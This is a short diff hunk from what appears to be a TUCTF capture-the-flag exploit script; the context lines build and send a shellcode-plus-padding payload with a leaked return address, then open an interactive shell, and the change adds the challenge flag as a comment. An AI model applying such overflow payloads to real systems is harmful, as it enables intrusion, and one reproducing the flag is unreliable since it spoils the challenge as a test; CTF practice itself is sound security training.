@@ -21,3 +21,5 @@ payload = shellcode+"A"*(pad-len(shellcode))+p32(leak_ret)
 
 p.send(payload)
 p.interactive()
+
+#TUCTF{4www..._b4by5_f1r57_3xpl017._h0w_cu73}
